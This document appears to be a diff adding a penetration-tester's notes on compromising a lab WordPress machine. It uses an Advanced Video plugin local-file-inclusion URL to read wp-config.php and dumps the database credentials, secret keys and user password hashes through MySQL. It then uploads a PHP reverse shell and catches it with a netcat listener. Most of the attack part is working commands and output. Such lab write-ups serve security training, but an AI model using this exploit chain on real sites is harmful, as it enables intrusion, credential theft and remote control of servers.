@@ -303,4 +303,169 @@ Disallow: /blogblog/   # a wordpress pgge
     wp-content
     wp-admin
 
+#under wp-content 
+  /wp-content/readme.txt.  this is a wp plugin, may vulnerable to a exsploit
+    === Advanced video embed  ===
+Contributors: arshmultani,meenakshi.php.developer,DScom
+Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=Z7C7DNDD9VS3L
+Tags: advanced video embed,youtube video embed,auto poster, wordpress youtube playlist maker,wordpress youtube playlists,wordpress youtube plugin,wordpress youtube embed,wordpress videos youtube,wordpress youtube video shortcode,wordpress youtube video as post,video embed , wordpress video embeding plugin,
+Requires at least: 3.0.1
+Tested up to: 3.3.1
+Stable tag: 1.0
+Version: 1.0
+
+
+└─$ searchsploit Advanced video
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                               |  Path
+--------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+WordPress Plugin Advanced Video 1.0 - Local File Inclusion                                                                                   | php/webapps/39646.py
+
+
+#after read the content of exp, try to access the url below
+https://192.168.56.4:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php
+https://192.168.56.4:12380/blogblog/?p=210
+
+
+#then find a file under:   https://192.168.56.4:12380/blogblog/wp-content/uploads/
+
+[ICO]	Name	Last modified	Size	Description
+[PARENTDIR]	Parent Directory	 	- 	 
+[IMG]	1871068732.jpeg	2024-05-06 12:00 	3.0K	 
+
+
+#download it and view the strings of the .conf
+ed@1nk:~$ strings 1871068732.jpeg 
+<?php
+ * The base configurations of the WordPress.
+ * This file has the following configurations: MySQL settings, Table Prefix,
+ * Secret Keys, and ABSPATH. You can find more information by visiting
+ * {@link https://codex.wordpress.org/Editing_wp-config.php Editing wp-config.php}
+ * Codex page. You can get the MySQL settings from your web host.
+ * This file is used by the wp-config.php creation script during the
+ * installation. You don't have to use the web site, you can just copy this file
+ * to "wp-config.php" and fill in the values.
+ * @package WordPress
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'wordpress');
+/** MySQL database username */
+define('DB_USER', 'root');
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+/** MySQL hostname */
+define('DB_HOST', 'localhost');
+/** Database Charset to use in creating database tables. */
+define('DB_CHARSET', 'utf8mb4');
+/** The Database Collate type. Don't change this if in doubt. */
+define('DB_COLLATE', '');
+/**#@+
+ * Authentication Unique Keys and Salts.
+ * Change these to different unique phrases!
+ * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
+ * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
+ * @since 2.6.0
+define('AUTH_KEY',         'V 5p=[.Vds8~SX;>t)++Tt57U6{Xe`T|oW^eQ!mHr }]>9RX07W<sZ,I~`6Y5-T:');
+define('SECURE_AUTH_KEY',  'vJZq=p.Ug,]:<-P#A|k-+:;JzV8*pZ|K/U*J][Nyvs+}&!/#>4#K7eFP5-av`n)2');
+define('LOGGED_IN_KEY',    'ql-Vfg[?v6{ZR*+O)|Hf OpPWYfKX0Jmpl8zU<cr.wm?|jqZH:YMv;zu@tM7P:4o');
+define('NONCE_KEY',        'j|V8J.~n}R2,mlU%?C8o2[~6Vo1{Gt+4mykbYH;HDAIj9TE?QQI!VW]]D`3i73xO');
+define('AUTH_SALT',        'I{gDlDs`Z@.+/AdyzYw4%+<WsO-LDBHT}>}!||Xrf@1E6jJNV={p1?yMKYec*OI$');
+define('SECURE_AUTH_SALT', '.HJmx^zb];5P}hM-uJ%^+9=0SBQEh[[*>#z+p>nVi10`XOUq (Zml~op3SG4OG_D');
+define('LOGGED_IN_SALT',   '[Zz!)%R7/w37+:9L#.=hL:cyeMM2kTx&_nP4{D}n=y=FQt%zJw>c[a+;ppCzIkt;');
+define('NONCE_SALT',       'tb(}BfgB7l!rhDVm{eK6^MSN-|o]S]]axl4TE_y+Fi5I-RxN/9xeTsK]#ga_9:hJ');
+/**#@-*/
+ * WordPress Database Table prefix.
+ * You can have multiple installations in one database if you give each a unique
+ * prefix. Only numbers, letters, and underscores please!
+$table_prefix  = 'wp_';
+ * For developers: WordPress debugging mode.
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+define('WP_DEBUG', false);
+/* That's all, stop editing! Happy blogging. */
+/** Absolute path to the WordPress directory. */
+if ( !defined('ABSPATH') )
+	define('ABSPATH', dirname(__FILE__) . '/');
+/** Sets up WordPress vars and included files. */
+require_once(ABSPATH . 'wp-settings.php');
+define('WP_HTTP_BLOCK_EXTERNAL', true);
+
+#got the user/passwd of mysql
+/** MySQL database username */
+define('DB_USER', 'root');
+/** MySQL database password */
+define('DB_PASSWORD', 'plbkac');
+
+
+└─$ mysql -h 192.168.56.4 -u root -p
+Enter password: 
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 18
+Server version: 5.7.12-0ubuntu1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [wordpress]> select concat(user_pass,"-",user_login,"-",user_nicename) from wp_users;
++----------------------------------------------------+
+| concat(user_pass,"-",user_login,"-",user_nicename) |
++----------------------------------------------------+
+| $P$B7889EMq/erHIuZapMB8GEizebcIy9.-John-john       |
+| $P$BlumbJRRBit7y50Y17.UPJ/xEgv4my0-Elly-elly       |
+| $P$BTzoYuAFiBA5ixX2njL0XcLzu67sGD0-Peter-peter     |
+| $P$BIp1ND3G70AnRAkRY41vpVypsTfZhk0-barry-barry     |
+| $P$Bwd0VpK8hX4aN.rZ14WDdhEIGeJgf10-heather-heather |
+| $P$BzjfKAHd6N4cHKiugLX.4aLes8PxnZ1-garry-garry     |
+| $P$BqV.SQ6OtKhVV7k7h1wqESkMh41buR0-harry-harry     |
+| $P$BFmSPiDX1fChKRsytp1yp8Jo7RdHeI1-scott-scott     |
+| $P$BZlxAMnC6ON.PYaurLGrhfBi6TjtcA0-kathy-kathy     |
+| $P$BXDR7dLIJczwfuExJdpQqRsNf.9ueN0-tim-tim         |
+| $P$B.gMMKRP11QOdT5m1s9mstAUEDjagu1-ZOE-zoe         |
+| $P$Bl7/V9Lqvu37jJT.6t4KWmY.v907Hy.-Dave-dave       |
+| $P$BLxdiNNRP008kOQ.jE44CjSK/7tEcz0-Simon-simon     |
+| $P$ByZg5mTBpKiLZ5KxhhRe/uqR.48ofs.-Abby-abby       |
+| $P$B85lqQ1Wwl2SqcPOuKDvxaSwodTY131-Vicki-vicki     |
+| $P$BuLagypsIJdEuzMkf20XyS5bRm00dQ0-Pam-pam         |
++----------------------------------------------------+
+16 rows in set (0.002 sec)
+
+#easyway to https://192.168.56.4:12380/phpmyadmin to edit the passwd of john,which maybe the admin of wp
+
+#then go to https://192.168.56.4:12380/blogblog/wp-admin/plugin-install.php to upload web shell to wp
+
+
+cp /usr/share/webshells/php/php-reverse-shell.php .
+
+#after installed the wbshell, it could be found under
+https://192.168.56.4:12380/blogblog/wp-content/uploads/
+#https://192.168.56.4:12380/blogblog/wp-content/uploads/s.php access it afer nc listen...
+
+└─$ nc -nvlp 4444                         
+listening on [any] 4444 ...
+connect to [192.168.56.5] from (UNKNOWN) [192.168.56.4] 40480
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
+ 17:35:36 up  7:19,  0 users,  load average: 0.00, 0.01, 0.05
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+www-data@red:/$ cat /etc/os*
+cat /etc/os*
+NAME="Ubuntu"
+VERSION="16.04 LTS (Xenial Xerus)"
+ID=ubuntu
+ID_LIKE=debian
+PRETTY_NAME="Ubuntu 16.04 LTS"
+VERSION_ID="16.04"
+HOME_URL="http://www.ubuntu.com/"
+SUPPORT_URL="http://help.ubuntu.com/"
+BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
+UBUNTU_CODENAME=xenial
+www-data@red:/$ uname -a
+uname -a
+Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
 
